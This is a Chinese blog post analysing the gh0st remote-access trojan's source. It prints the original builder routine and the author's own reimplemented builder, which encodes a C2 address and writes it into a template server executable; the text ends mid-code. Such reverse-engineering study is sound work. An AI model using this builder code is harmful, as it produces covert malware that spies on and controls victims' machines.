<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#f5b8d5"><meta name="author" content="l1pmoluy,1392181761@qq.com"><meta name="copyright" content="l1pmoluy"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>gh0st源码分析 | l1pmoluy</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#f5b8d5"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"l1pmoluy.github.io","root":"/","title":"踏着梦走过时光","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"algolia":{"hits":{"per_page":8}},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="l1pmoluy" type="application/atom+xml"><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><meta name="description" content="gh0st源码分析">
<meta property="og:type" content="article">
<meta property="og:title" content="gh0st源码分析">
<meta property="og:url" content="https://l1pmoluy.github.io/2025/10/08/gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="l1pmoluy">
<meta property="og:description" content="gh0st源码分析">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-10-08T06:55:14.000Z">
<meta property="article:modified_time" content="2025-10-08T07:29:56.019Z">
<meta property="article:author" content="l1pmoluy">
<meta property="article:tag" content="项目">
<meta name="twitter:card" content="summary"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="l1pmoluy"><img width="96" loading="lazy" src="/images/rika.jpg" alt="l1pmoluy"><span class="site-author-status" title="Looking for dawn.">🥰</span></a><div class="site-author-name"><a href="/about/">l1pmoluy</a></div><span class="site-name">l1pmoluy</span><sub class="site-subtitle">Dawing...</sub><div class="site-description">l1pmoluy's blog</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">11</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">2</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">3</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" title="1392181761" target="_blank" style="color:#12B7F5"><span class="icon iconify" data-icon="ri:qq-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://blog.csdn.net/dawn_ing_" title="csdn" target="_blank" style="color:#e83b07"><span class="icon iconify" data-icon="ri:terminal-box-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://bbs.kanxue.com/user-home-1012312.htm" title="看雪" target="_blank" style="color:#e83b07"><span class="icon iconify" data-icon="ri:snowflake-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="1392181761@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.yuque.com/l1pmpluy" title="语雀" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:yuque-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="友链" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:user-community-line"></span></a><a class="links-item hty-icon-button" href="/girl/" title="喜欢的女孩子" style="color:hotpink"><span class="icon iconify" data-icon="ri:women-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#dEJeZ"><span class="toc-number">1.</span> <span class="toc-text">流程理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SX86Z"><span class="toc-number">2.</span> <span class="toc-text">代码结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ce3dE"><span class="toc-number">3.</span> <span class="toc-text">源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bILXS"><span class="toc-number">3.1.</span> <span class="toc-text">客户端部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSc7y"><span class="toc-number">3.2.</span> <span class="toc-text">服务端部分</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#thIjT"><span class="toc-number">3.2.1.</span> <span class="toc-text">install</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kGzUH"><span class="toc-number">3.2.2.</span> <span class="toc-text">svchost</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#k85PT"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">FileManager</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#egIuX"><span class="toc-number">3.2.2.2.</span> <span class="toc-text">ScreenManager</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#f5b8d5;"><link itemprop="mainEntityOfPage" href="https://l1pmoluy.github.io/2025/10/08/gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="l1pmoluy,1392181761@qq.com"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="l1pmoluy"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">gh0st源码分析</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-10-8 14:55:14" itemprop="dateCreated datePublished" datetime="2025-10-08T14:55:14+08:00">2025-10-8</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">3k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">15m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E9%80%86%E5%90%91%E8%A1%8C%E9%A9%B6/" style="--text-color:#FF0000" itemprop="url" rel="index"><span itemprop="text">逆向行驶</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E9%A1%B9%E7%9B%AE/" style="--text-color:#800080"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">项目</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p>gh0st源码分析</p>
<span id="more"></span>

<h2 id="dEJeZ">流程理解</h2>

<p>客户端通过本地模板并写入信息生成服务端-install.exe 具体逻辑将提前放在.rdata中的dll取出，并注册服务在svchost下</p>
<p>dll的内容是删去install.exe并且自行隐藏，然后取出加密后的ip解密，向客户端发送随机事件名，响应后根据发来的包决定转接哪个Manager，如FIle，Screen等</p>
<h2 id="SX86Z">代码结构</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gh0st/</span><br><span class="line">├─gh0st/</span><br><span class="line">|   ├─gh0st.cpp				 #客户端的初始化</span><br><span class="line">|		├─BuildView.cpp		 #读取Server文件，写入加密信息</span><br><span class="line">|		└──SettingsView.cpp#ip和端口号的填写加密</span><br><span class="line">├─install/</span><br><span class="line">|		└─install.cpp			 #运行时解密出需要的信息，取出svchost挂在服务下</span><br><span class="line">└─svchost/</span><br><span class="line"> 		├─svchost.cpp			 #删除install，基本上就隐藏了，然后登录客户端，调用</span><br><span class="line">    |                  #KernelManager等待响应</span><br><span class="line"> 		├─KernelManager.cpp#分发Manager的，比如Screen、Keyboard</span><br><span class="line"> 		├─FileManager.cpp	 #接收客户端的信息进行文件操作</span><br><span class="line"> 		└─ScreenManager.cpp#接收客户端信息进行屏幕操作</span><br></pre></td></tr></table></figure>

<h2 id="ce3dE">源码分析</h2>
<h3 id="bILXS">客户端部分</h3>
从模板install.exe中生成服务端exe



<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBuildView::OnBuild</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">	<span class="built_in">UpdateData</span>(<span class="literal">true</span>);</span><br><span class="line">	<span class="keyword">if</span> (m_ServiceDisplayName.<span class="built_in">IsEmpty</span>() || m_ServiceDescription.<span class="built_in">IsEmpty</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">AfxMessageBox</span>(<span class="string">&quot;请完整填写服务显示名称和描述 -:(&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	CString strAddress;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 保存配置</span></span><br><span class="line">	((CGh0stApp *)<span class="built_in">AfxGetApp</span>())-&gt;m_IniFile.<span class="built_in">SetString</span>(<span class="string">&quot;Build&quot;</span>, <span class="string">&quot;DisplayName&quot;</span>, m_ServiceDisplayName);</span><br><span class="line">	((CGh0stApp *)<span class="built_in">AfxGetApp</span>())-&gt;m_IniFile.<span class="built_in">SetString</span>(<span class="string">&quot;Build&quot;</span>, <span class="string">&quot;Description&quot;</span>, m_ServiceDescription);</span><br><span class="line">	((CGh0stApp *)<span class="built_in">AfxGetApp</span>())-&gt;m_IniFile.<span class="built_in">SetInt</span>(<span class="string">&quot;Build&quot;</span>, <span class="string">&quot;enablehttp&quot;</span>, m_enable_http);</span><br><span class="line">	<span class="keyword">if</span> (m_enable_http)</span><br><span class="line">	&#123;</span><br><span class="line">		CString str;</span><br><span class="line">		<span class="built_in">GetDlgItemText</span>(IDC_URL, str);</span><br><span class="line">		((CGh0stApp *)<span class="built_in">AfxGetApp</span>())-&gt;m_IniFile.<span class="built_in">SetString</span>(<span class="string">&quot;Build&quot;</span>, <span class="string">&quot;httpurl&quot;</span>, str);</span><br><span class="line">		str.<span class="built_in">MakeLower</span>();</span><br><span class="line">		strAddress = <span class="built_in">MyEncode</span>(str.<span class="built_in">GetBuffer</span>(<span class="number">0</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">GetDlgItemText</span>(IDC_DNS_STRING, strAddress);</span><br><span class="line">        <span class="comment">//读取格式为AAAA加密后的ipAAAA</span></span><br><span class="line">		<span class="keyword">if</span> (strAddress.<span class="built_in">Find</span>(<span class="string">&quot;AAAA&quot;</span>) == <span class="number">-1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">AfxMessageBox</span>(<span class="string">&quot;域名上线字串格式出错 -:(&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		strAddress.<span class="built_in">Replace</span>(<span class="string">&quot;AAAA&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	CString		strServiceConfig;</span><br><span class="line">	strServiceConfig.<span class="built_in">Format</span>(<span class="string">&quot;%s|%s&quot;</span>, <span class="built_in">MyEncode</span>(m_ServiceDisplayName.<span class="built_in">GetBuffer</span>(<span class="number">0</span>)), </span><br><span class="line">		<span class="built_in">MyEncode</span>(m_ServiceDescription.<span class="built_in">GetBuffer</span>(<span class="number">0</span>)));</span><br><span class="line">    </span><br><span class="line">	<span class="function">CFileDialog <span class="title">dlg</span><span class="params">(FALSE, <span class="string">&quot;exe&quot;</span>, <span class="string">&quot;server.exe&quot;</span>, OFN_OVERWRITEPROMPT,<span class="string">&quot;可执行文件|*.exe&quot;</span>, <span class="literal">NULL</span>)</span></span>;</span><br><span class="line">	<span class="keyword">if</span>(dlg.<span class="built_in">DoModal</span> () != IDOK)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	</span><br><span class="line">	HINSTANCE	hInstance;</span><br><span class="line">	HRSRC		hResInfo;</span><br><span class="line">	DWORD		dwResLen;</span><br><span class="line">	HGLOBAL		hResData;</span><br><span class="line">	LPBYTE		lpData;</span><br><span class="line">	hInstance = <span class="built_in">AfxGetApp</span>()-&gt;m_hInstance;</span><br><span class="line">	hResInfo = <span class="built_in">FindResource</span>(hInstance, (LPCTSTR)IDR_BSS, (LPCTSTR)<span class="string">&quot;BSS&quot;</span>);</span><br><span class="line">	dwResLen = <span class="built_in">SizeofResource</span>(hInstance, hResInfo);</span><br><span class="line">	hResData = <span class="built_in">LoadResource</span>(hInstance, hResInfo);</span><br><span class="line">	lpData = (LPBYTE)<span class="built_in">LockResource</span>(hResData);</span><br><span class="line"></span><br><span class="line">	CFile file;</span><br><span class="line">	<span class="keyword">if</span>(file.<span class="built_in">Open</span> (dlg.<span class="built_in">GetPathName</span>(), CFile::modeCreate | CFile::modeWrite))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">try</span></span><br><span class="line">		&#123;</span><br><span class="line">			file.<span class="built_in">Write</span>(lpData, dwResLen);</span><br><span class="line">			<span class="comment">// 写入6个&#x27;C&#x27;,是服务的名称和描述</span></span><br><span class="line">			file.<span class="built_in">Write</span>(<span class="string">&quot;CCCCCC&quot;</span>, <span class="number">6</span>);</span><br><span class="line">			file.<span class="built_in">Write</span>(strServiceConfig, strServiceConfig.<span class="built_in">GetLength</span>() + <span class="number">1</span>);</span><br><span class="line">			<span class="comment">// 写入6个&#x27;A&#x27;,安装时查找</span></span><br><span class="line">			file.<span class="built_in">Write</span>(<span class="string">&quot;AAAAAA&quot;</span>, <span class="number">6</span>);</span><br><span class="line">			file.<span class="built_in">Write</span>(strAddress, strAddress.<span class="built_in">GetLength</span>() + <span class="number">1</span>);</span><br><span class="line">			file.<span class="built_in">Close</span>();</span><br><span class="line">			<span class="built_in">AfxMessageBox</span>(<span class="string">&quot;文件保存成功，请用加壳软件进行压缩 -:)&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">catch</span>(...)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">MessageBox</span>(<span class="string">&quot;文件保存失败，请检查&quot;</span>,<span class="string">&quot;提示&quot;</span>,MB_OK|MB_ICONSTOP);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">FreeResource</span>(hResData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这里每次改动dll或者install.exe的时候都要按照svchost-&gt;install-&gt;gh0st的顺序全部重新编译，所以自己复现了一个直接凭借install.exe生成目标文件的代码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">char</span> base64[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">base64_encode</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* data, <span class="type">int</span> size, <span class="type">char</span>** str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span>* s, * p;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="type">int</span> c;</span><br><span class="line">	<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* q;</span><br><span class="line"></span><br><span class="line">	p = s = (<span class="type">char</span>*)<span class="built_in">malloc</span>(size * <span class="number">4</span> / <span class="number">3</span> + <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	q = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)data;</span><br><span class="line">	i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size;) &#123;</span><br><span class="line">		c = q[i++];</span><br><span class="line">		c *= <span class="number">256</span>;</span><br><span class="line">		<span class="keyword">if</span> (i &lt; size)</span><br><span class="line">			c += q[i];</span><br><span class="line">		i++;</span><br><span class="line">		c *= <span class="number">256</span>;</span><br><span class="line">		<span class="keyword">if</span> (i &lt; size)</span><br><span class="line">			c += q[i];</span><br><span class="line">		i++;</span><br><span class="line">		p[<span class="number">0</span>] = base64[(c &amp; <span class="number">0x00fc0000</span>) &gt;&gt; <span class="number">18</span>];</span><br><span class="line">		p[<span class="number">1</span>] = base64[(c &amp; <span class="number">0x0003f000</span>) &gt;&gt; <span class="number">12</span>];</span><br><span class="line">		p[<span class="number">2</span>] = base64[(c &amp; <span class="number">0x00000fc0</span>) &gt;&gt; <span class="number">6</span>];</span><br><span class="line">		p[<span class="number">3</span>] = base64[(c &amp; <span class="number">0x0000003f</span>) &gt;&gt; <span class="number">0</span>];</span><br><span class="line">		<span class="keyword">if</span> (i &gt; size)</span><br><span class="line">			p[<span class="number">3</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span> (i &gt; size + <span class="number">1</span>)</span><br><span class="line">			p[<span class="number">2</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">		p += <span class="number">4</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	*p = <span class="number">0</span>;</span><br><span class="line">	*str = s;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strlen</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">MyEncode</span><span class="params">(<span class="type">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span>		i, len;</span><br><span class="line">	<span class="type">char</span>* p;</span><br><span class="line">	<span class="type">char</span>* s, * data;</span><br><span class="line">	len = <span class="built_in">strlen</span>(str) + <span class="number">1</span>;</span><br><span class="line">	s = (<span class="type">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">	<span class="built_in">memcpy</span>(s, str, len);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i] ^= <span class="number">0x19</span>;</span><br><span class="line">		s[i] += <span class="number">0x86</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">base64_encode</span>(s, len, &amp;data);</span><br><span class="line">	<span class="built_in">free</span>(s);</span><br><span class="line">	<span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">my_strstr</span><span class="params">(<span class="type">char</span>* a1, <span class="type">char</span>* a2, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">		a1[i] = a2[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">	<span class="type">int</span> enablehttp = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> InputStr[<span class="number">100</span>];	<span class="comment">//端口域名</span></span><br><span class="line">	<span class="type">char</span>* EnInputStr;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, InputStr);</span><br><span class="line">	<span class="comment">//printf(&quot;%s&quot;, MyEncode(InputStr));</span></span><br><span class="line">	EnInputStr = <span class="built_in">MyEncode</span>(InputStr);</span><br><span class="line">	<span class="type">char</span> strServiceConfig[<span 